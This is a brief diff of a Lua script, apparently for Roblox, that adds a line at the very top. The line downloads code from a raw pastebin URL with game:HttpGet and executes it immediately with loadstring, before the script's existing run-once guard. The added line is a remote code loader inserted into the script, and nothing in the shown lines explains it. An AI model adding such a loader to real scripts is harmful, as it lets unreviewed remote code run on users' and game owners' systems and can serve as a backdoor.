@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/xP6ZjFPq"))()
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
 	return
